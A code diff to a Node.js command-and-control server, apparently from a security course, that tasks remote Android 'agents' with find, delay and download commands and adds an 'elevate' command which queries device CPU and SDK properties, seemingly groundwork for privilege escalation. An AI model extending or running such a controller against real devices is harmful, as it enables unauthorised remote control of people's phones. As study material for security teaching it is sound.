@@ -12,6 +12,7 @@ const Agent = require('./agent');
 
 const app = express();
 
+const URL = "http://cs4001.root.sx/";
 const PORT = 3000;
 const CLIENTS_DIRECTORY = 'clients';
 const CLIENT_TIMEOUT = 20 * 1000; // timeout of 20 seconds
@@ -37,6 +38,7 @@ function printUsage() {
               '       agent <ID> find <name> <location>\n' +
               '       agent <ID> delay <seconds>\n' +
               '       agent <ID> download <url> <location>\n' +
+              '       agent <ID> elevate\n' +
               '       exit\n');
 }
 
@@ -141,6 +143,15 @@ rl.on('line', line => {
             break;
           }
 
+          case 'elevate': {
+            if (id in agents) {
+              elevate(id);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
+          }
+
           default: {
             printUsage();
           }
@@ -204,6 +215,11 @@ function download(id, url, location) {
   }
 
   agents[id].queueCommand({ type: 'download', data: { url, location } });
+}
+
+function elevate(id) {
+  sendCommand(id, "getprop ro.product.cpu.abi");
+  sendCommand(id, "getprop ro.build.version.sdk");
 }
 
 // ---------- express endpoints ---------- //
